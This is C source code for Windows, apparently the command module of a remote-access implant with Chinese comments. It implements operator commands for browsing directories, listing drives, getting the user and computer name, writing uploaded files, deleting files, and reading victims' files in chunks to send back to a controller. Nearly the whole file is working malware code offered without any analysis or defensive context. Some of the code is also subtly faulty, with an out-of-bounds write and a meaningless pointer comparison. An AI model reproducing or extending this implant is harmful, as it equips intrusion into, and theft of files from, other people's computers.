#define _TIMESPEC_DEFINED  // 防止 windows.h 重复定义 timespec
#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "Command.h"
#include <iphlpapi.h>
#pragma warning(disable:4996)
#define PATH_MAX 4096
#define MAX_PATH_LENGTH 1048
#define MAX_TIME_STRING_LENGTH 50
extern unsigned char AESRandaeskey[16];
extern int Counter;

wchar_t* convertToWideChar(const unsigned char* input) {
    int len = MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, NULL, 0);
    if (len == 0) {
        fprintf(stderr, "MultiByteToWideChar failed\n");
        return NULL;
    }

    wchar_t* wideStr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (wideStr == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    if (MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, wideStr, len) == 0) {
        fprintf(stderr, "MultiByteToWideChar failed\n");
        free(wideStr);
        return NULL;
    }

    return wideStr;
}

unsigned char* convertWideCharToUTF8(const wchar_t* wideStr) {
    if (!wideStr) return NULL;

    int utf8Len = wcstombs(NULL, wideStr, 0);
    if (utf8Len <= 0) return NULL;

    unsigned char* utf8Str = (unsigned char*)malloc(utf8Len + 1);
    if (!utf8Str) return NULL;

    wcstombs((char*)utf8Str, wideStr, utf8Len);
    utf8Str[utf8Len] = '\0';

    return utf8Str;
}

unsigned char* listDirectory(unsigned char* dirPathy, size_t* dirPathStrlen) {
    
    setlocale(LC_ALL, "");
    wchar_t* path = convertToWideChar(dirPathy);
    struct _wfinddata_t file_info;
    intptr_t handle;
    wchar_t search_path[MAX_PATH_LENGTH];
    size_t len = wcslen(path);

    if (len > 0 && path[len - 1] == L'/') {
        path[len - 1] = L'\0';
    }

    swprintf(search_path, MAX_PATH_LENGTH, L"%s\\*", path);

    if ((handle = _wfindfirst(search_path, &file_info)) == -1L) {
        fprintf(stderr, "Unable to open directory");
        wcscpy(search_path, L"C:\\*");
        handle = _wfindfirst(search_path, &file_info);
    }

    wchar_t resultStr[PATH_MAX];
    resultStr[0] = L'\0';

    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"%s", search_path);
    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", L"20/12/2023 12:10:12", L".");
    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", L"20/12/2023 12:10:12", L"..");
    wchar_t timeString[MAX_TIME_STRING_LENGTH];
    do {
        if (wcscmp(file_info.name, L".") != 0 && wcscmp(file_info.name, L"..") != 0) {
            if (file_info.attrib & _A_SUBDIR) {
                time_t modified_time = (time_t)file_info.time_write;
                struct tm* timeinfo = localtime(&modified_time);

                wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);

                swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", timeString,file_info.name);
            }
            else {
                time_t modified_time = (time_t)file_info.time_write;
                struct tm* timeinfo = localtime(&modified_time);

                wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);
                swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nF\t%lld\t%s\t%s",file_info.size , timeString ,file_info.name);
               
            }
        }
    } while (_wfindnext(handle, &file_info) == 0);

    _findclose(handle);

    unsigned char* resultStrchar = convertWideCharToUTF8(resultStr);
    *dirPathStrlen = strlen(resultStrchar);

    return resultStrchar;
}

unsigned char* CmdFileBrowse(unsigned char* commandBuf,size_t* msgLen) {
    uint8_t pendingRequest[4];
    uint8_t dirPathLenBytes[4];

    unsigned char* pendingRequeststart = commandBuf;
    unsigned char* dirPathLenBytesstart = commandBuf + 4;
    memcpy(pendingRequest, pendingRequeststart, 4);
    memcpy(dirPathLenBytes, dirPathLenBytesstart, 4);
    uint32_t dirPathLen = bigEndianUint32(dirPathLenBytes);
    unsigned char* dirPathBytes = (unsigned char*)malloc(dirPathLen);
    unsigned char* dirPathBytesstart = commandBuf + 8;

    if (dirPathLen) {
        memcpy(dirPathBytes, dirPathBytesstart, dirPathLen);
        dirPathBytes[dirPathLen] = '\0';
    }
    
    unsigned char*  dirPathStr = str_replace_all(dirPathBytes, "*", "");
    
    unsigned char* dirPathStr11[] = {0x2e, 0x2f};

    if (*dirPathStr == *dirPathStr11) {
        char cwd[PATH_MAX];
        if (getcwd(cwd, sizeof(cwd)) == NULL) {
            fprintf(stderr, "getcwd failed\n");
            return NULL;
        }

        unsigned char* relativePath = ""; // 相对路径
        char absolutePath[PATH_MAX];
        snprintf(absolutePath, sizeof(absolutePath), "%s/%s", cwd, relativePath);
        dirPathStr = absolutePath;
    }
    else
    {
        dirPathStr = str_replace_all(dirPathStr, "/", "\\");
    }
    size_t dirPathStrlen;
    
    unsigned char* result = listDirectory(dirPathStr,&dirPathStrlen);
    
    uint8_t* result8 = (uint8_t*)result;
    uint8_t* metaInfoArrays[] = { pendingRequest, result8 };
    size_t metaInfoSizes[] = { 4,dirPathStrlen };
    size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
    uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
    size_t metaInfoTotalSize = 0;

    for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
        metaInfoTotalSize += metaInfoSizes[i];
    }

    int callbackType = 0;
    *msgLen = metaInfoTotalSize;

    return metaInfoMsg;
}

unsigned char* CmdUpload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen, DWORD chunkNumber) {
    uint8_t fileNameLenBytes[4];

	// commandBuf 数据结构如下
	// fileNameLenBigEndian(4Bytes) | fileName(fileNameLenBigEndian Bytes) | fileContent(rest Bytes)
    unsigned char* fileNameLength = commandBuf;
    
    memcpy(fileNameLenBytes, fileNameLength, 4);

    uint32_t fileNameLenBigEndian = bigEndianUint32(fileNameLenBytes);
    unsigned char* fileName = (unsigned char*)malloc(fileNameLenBigEndian + 1);
    if(!fileName){
        fprintf(stderr, "Memory Allocation failed for fileName\n");
		return NULL;
    }
    fileName[fileNameLenBigEndian] = '\0';

    
    unsigned char* fileNameBuffer = commandBuf + 4;
    memcpy(fileName, fileNameBuffer, fileNameLenBigEndian);

    size_t fileContenthLen = *commandBuflen - 4 - (size_t)fileNameLenBigEndian;
    unsigned char* fileContent = commandBuf + fileNameLenBigEndian + 4;

    unsigned char* buffer = (unsigned char*)malloc(1024);

    if (!buffer) {
        fprintf(stderr, "Memory Allocation failed for chunk\n");
        return NULL;
    }

    size_t bytesRead;
    size_t offset = 0;

    // 每次写入 1KB
    while (offset < fileContenthLen) {
        size_t remaining = fileContenthLen - offset;
        size_t bufferSize = remaining > 1024 ? 1024 : remaining;

        memcpy(buffer, fileContent + offset, bufferSize);

        if (Upload(fileName, buffer, bufferSize, chunkNumber)) {
            offset += bufferSize;
            chunkNumber++;
        }
    }

    unsigned char* Uploadstr = "[+] Upload Successfully! File Size:";
    unsigned char offsetStr[20];     
    // 将整数转换为字符串
	// size_t 为 long long 类型使用%lld
    sprintf(offsetStr, "%zu", offset);
    unsigned char* result = (unsigned char*)malloc(strlen(offsetStr) + strlen(Uploadstr) + 1);
    if (result) {
        memcpy(result, Uploadstr, strlen(Uploadstr));
        memcpy(result + strlen(Uploadstr), offsetStr, strlen(offsetStr));
        *msgLen = strlen(offsetStr) + strlen(Uploadstr);
    }
	result[*msgLen] = '\0';

    free(fileName);
    free(buffer);
    return result;
}

BOOL Upload(unsigned char* filePath, unsigned char* fileContent, size_t fileContentSize, int isStart) {
    FILE* file;
    const char* mode;
    
    if (isStart == 1) {
        // 如果文件已存在，会清空原有内容（文件长度变为 0）
        // 如果文件不存在，会新建文件
        // 写入时从文件开头开始写
        mode = "wb"; 
    }
    else {
        // 如果文件已存在，写入的位置永远在文件末尾，不会覆盖前面的内容
        // 如果文件不存在，会新建文件
        mode = "ab"; 
    }

    file = fopen(filePath, mode);
    if (file == NULL) {
        perror("File Open Error");
        return FALSE;
    }

    int bytesWritten = fwrite(fileContent, sizeof(unsigned char), fileContentSize, file);
    if (bytesWritten != fileContentSize) {
        perror("File Write Error");
        fclose(file);
        return FALSE;
    }

    fclose(file);
    return TRUE;
}

unsigned char* CmdDrives(unsigned char* commandBuf, size_t* msgLen) {

    DWORD drives = GetLogicalDrives();
    unsigned char drivesStr[20];
    // 转化为字符串
    sprintf(drivesStr, "%d", drives);

    unsigned char* result = (unsigned char*)malloc(strlen(drivesStr) + 1);
    if (result) {
        memcpy(result, drivesStr, strlen(drivesStr));
        result[strlen(drivesStr)] = '\0';
        uint8_t command[4];
        memcpy(command, commandBuf, 4);

        uint8_t* metaInfoArrays[] = { command, result };
        size_t metaInfoSizes[] = { 4, strlen(result) };
        size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
        uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
        size_t metaInfoTotalSize = 0;

        // 计算所有 sizeof 返回值的总和
        for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
            metaInfoTotalSize += metaInfoSizes[i];
        }
        *msgLen = metaInfoTotalSize;

        return (unsigned char*)metaInfoMsg;
    }
}

unsigned char* CmdPwd(unsigned char* commandBuf, size_t* msgLen) {
    // 获取缓冲区所需大小，包括'\0'
    DWORD bufferSize = GetCurrentDirectoryA(0, NULL); 

    if (bufferSize == 0) {
        unsigned char* error = "[-] Error Get Directory";
        unsigned char* errorBuffer = (unsigned char*)malloc(strlen(error) + 1);
        memcpy(errorBuffer, error, strlen(error));
        *msgLen = strlen(error);
        return errorBuffer;
    }

    unsigned char* lpcurrentPath = (unsigned char*)malloc(bufferSize + 1);

    // result 不包括'\0'
    DWORD resultLen = GetCurrentDirectoryA(bufferSize, lpcurrentPath);

    if (resultLen == 0 || resultLen > bufferSize) {
		fprintf(stderr, "GetCurrentDirectoryA Failed With Error:%lu", GetLastError());
        free(lpcurrentPath);
    }

    *msgLen = resultLen;
	lpcurrentPath[*msgLen] = '\0';

    return lpcurrentPath;
}

unsigned char* CmdGetUid(unsigned char* commandBuf, size_t* msgLen) {
    unsigned char* computerName = (unsigned char*)malloc(MAX_COMPUTERNAME_LENGTH);
    unsigned char* userName = (unsigned char*)malloc(UNLEN);

    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (!GetComputerNameA(computerName, &size)) {
        fprintf(stderr, "GetComputerNameA Failed With Error:%lu\n", GetLastError());
        return NULL;
    }

    size = UNLEN + 1;
    if (!GetUserNameA(userName, &size)) {
        fprintf(stderr, "GetUserNameA Failed With Error:%lu\n", GetLastError());
        return NULL;
    }

    if (computerName && userName) {
        size_t total_len = strlen(computerName) + strlen(userName) + 2; // 加两个'\0'
        unsigned char* result = malloc(total_len + 1);
        snprintf(result, total_len, "%s\\%s", computerName, userName);
        *msgLen = total_len;

		result[*msgLen] = '\0';
        return result;
    }
}

unsigned char* CmdMkdir(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen) {
    commandBuf[*commandBuflen] = '\0';
    if (!CreateDirectoryA((LPCSTR)commandBuf, NULL) != 0) {
        fprintf(stderr, "CreateDirectoryA Failed With Error：%lu\n", GetLastError());
        return NULL;
    }

    unsigned char* Mkdirstr = "[+] Mkdir Success:";
    unsigned char* result = (unsigned char*)malloc(strlen(Mkdirstr) + *commandBuflen + 1);
    if (result) {
        memcpy(result, Mkdirstr, strlen(Mkdirstr));
        memcpy(result + strlen(Mkdirstr), commandBuf, *commandBuflen);

        *msgLen = strlen(Mkdirstr) + *commandBuflen;

		result[*msgLen] = '\0';

        return result;
    }
}


unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen) {
    commandBuf[*commandBuflen] = '\0';
    DWORD attributes = GetFileAttributesA((LPCSTR)commandBuf);

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        const char* errorMsg = "[-] Remove failed:Invalid path or file";
        *msgLen = strlen(errorMsg);
        unsigned char* result = (unsigned char*)malloc(strlen(errorMsg) + 1);
        if (!result) {
            fprintf(stderr, "Memory allocation failed\n");
			return NULL;
        }
        memcpy(result, errorMsg, strlen(errorMsg));
        return result;
    }

    int removeResult;
    // 删除文件是目录的情况
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        removeResult = RemoveDirectoryA((LPCSTR)commandBuf);
    }
    // 文件
    else {
        removeResult = DeleteFileA((LPCSTR)commandBuf);
    }

    unsigned char* Removestr = removeResult == 0 ? "[-] Remove Failed:" : "[+] Remove Success:";
    size_t RemovestrLen = strlen(Removestr);

    *msgLen = RemovestrLen + *commandBuflen;
    unsigned char* result = (unsigned char*)malloc(*msgLen + 1);
    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    memcpy(result, Removestr, RemovestrLen);
    memcpy(result + RemovestrLen, commandBuf, *commandBuflen);
	result[*msgLen] = '\0';

    return result;
}

struct FileThreadArgs {
    unsigned char* fileNameBuf;
    size_t fileNameBufLen;
};

DWORD WINAPI myThreadFunction(LPVOID lpParam) {
    Sleep(2000);
    struct FileThreadArgs* args = (struct FileThreadArgs*)lpParam;
    unsigned char* fileNameBuf = args->fileNameBuf;
    size_t fileNameBufLen = args->fileNameBufLen;
    LPCSTR lpFilePath = (LPCSTR)fileNameBuf;
    uint64_t fileLen64Val;
    uint32_t fileLen32Val;

    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    if (GetFileAttributesExA(lpFilePath, GetFileExInfoStandard, &fileInfo)) {
        LARGE_INTEGER largeFileSize;
        largeFileSize.LowPart = fileInfo.nFileSizeLow;
        largeFileSize.HighPart = fileInfo.nFileSizeHigh;
        // 64 位文件总大小
        fileLen64Val = largeFileSize.QuadPart;
        // 最多下载 4GB 的文件
		// 否则返回错误信息
        if (largeFileSize.QuadPart > UINT32_MAX) {
            unsigned char* errorStr = "[-] The downloaded file is larger than 4GB";
			unsigned char* errorBuffer = (unsigned char*)malloc(strlen(errorStr) + 1);
            if (errorBuffer) {
                memcpy(errorBuffer, errorStr, strlen(errorStr));
                errorBuffer[strlen(errorStr)] = '\0';
                DataProcess(errorBuffer, strlen(errorBuffer), 0);
                return FALSE;
            }
        }
		// 文件大小已经在 4GB 范围内了, 可以直接赋值
        fileLen32Val = (uint32_t)largeFileSize.QuadPart;
    }

    else {
        fprintf(stderr, "Failed to get file attributes:%lu\n", GetLastError());
        return FALSE;
    }

    // 开始构造数据包 
    // 数据包格式: responseIdBigEndian(4Bytes) | fileLen32BigEndian(4Bytes) | buf(fileLen32BigEndian Bytes)
    uint8_t fileLen32BigEndian[4];
    PutUint32BigEndian(fileLen32BigEndian, fileLen32Val);
    uint32_t requestId = (uint32_t)GenerateRandomInt(10000, 99999);
    uint8_t responseIdBigEndian[4];
    PutUint32BigEndian(responseIdBigEndian, requestId);
    uint8_t* metaInfoArrays[] = { responseIdBigEndian, fileLen32BigEndian, fileNameBuf };
    size_t metaInfoSizes[] = { 4, 4, fileNameBufLen };
    size_t metaInfoCounts= sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
    uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
    size_t metaInfoTotalSize = 0;

    for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
        metaInfoTotalSize += metaInfoSizes[i];
    }

    DataProcess((unsigned char*)metaInfoMsg, metaInfoTotalSize, 2);

    HANDLE hFile = CreateFileA(fileNameBuf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "CreateFileA Failed With Error:%lu\n", GetLastError());
        return FALSE;
    }

    // 缓冲区 1MB
    unsigned char* fileBuffer = (unsigned char*)malloc(1024 * 1024); 
    if (fileBuffer == NULL) {
		fprintf(stderr, "Memory allocation failed\n");
        return FALSE;
    }

    DWORD bytesRead;
    // 数据包格式: requestIdBigEndian(4Bytes) | fileBuffer
    while (TRUE) {
        BOOL bRead = ReadFile(hFile, fileBuffer, 1024 * 1024, &bytesRead, NULL);
        if (!bRead && GetLastError() != 0) {
            break;
        }
        // 数据读取完了
        if (bytesRead == 0) {
            break;
        }
        uint8_t* metaInfoArrays[] = { responseIdBigEndian, fileBuffer };
        size_t metaInfoSizes[] = { 4, bytesRead };
        size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
        uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
        size_t metaInfoTotalSize = 4 + bytesRead;

        DataProcess(metaInfoMsg, metaInfoTotalSize, 8);
        Sleep(50);
    }

    unsigned char* downloadStr = "[+] Already Download file ";
    unsigned char* resultStr = (unsigned char*)malloc(strlen(downloadStr) + fileNameBufLen + 1);
    if (!resultStr) {
        fprintf(stderr, "Memory allocation failed for result\n");
        return FALSE;
    }
    memcpy(resultStr, downloadStr, strlen(downloadStr));
    memcpy(resultStr + strlen(downloadStr), args->fileNameBuf, fileNameBufLen);
    size_t msgLen = strlen(downloadStr) + fileNameBufLen;

    resultStr[msgLen] = '\0';

    DataProcess(resultStr, msgLen, 0);

    free(args->fileNameBuf);
    free(args);
    free(fileBuffer);

    return TRUE;
}

VOID CmdFileDownload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen) {
    struct FileThreadArgs* args = (struct FileThreadArgs*)malloc(sizeof(struct FileThreadArgs));
    if (args == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return;
    }

    args->fileNameBuf = (unsigned char*)malloc(*commandBuflen + 1);
    if (args->fileNameBuf) {
        memcpy(args->fileNameBuf, commandBuf, *commandBuflen);
        args->fileNameBuf[*commandBuflen] = '\0';

        args->fileNameBufLen = *commandBuflen;
    }
    DWORD attributes = GetFileAttributesA((LPCSTR)args->fileNameBuf);

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        const char* errorMsg = "[-] GetFileAttributesA failed: Invalid path or file";
        unsigned char* errorStr = (unsigned char*)malloc(strlen(errorMsg) + 1);
        if (errorStr) {
            memcpy(errorStr, errorMsg, strlen(errorMsg));
            *msgLen = strlen(errorMsg);
			errorStr[strlen(errorMsg)] = '\0';
            DataProcess(errorStr, strlen(errorMsg), 0);
        }
    }

    // 目录
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        fprintf(stderr, "Unable to download directory\n");
        return;
    }

    HANDLE myThread = CreateThread(
        NULL,                       // 默认线程安全性
        0,                          // 默认堆栈大小
        myThreadFunction,           // 线程函数
        args,                       // 传递给线程函数的参数
        0,                          // 默认创建标志
        NULL);                      // 不存储线程ID

    if (myThread == NULL) {
        fprintf(stderr, "CreateThread Failed With Error: %lu\n", GetLastError());
        return NULL;
    }

    CloseHandle(myThread);
}

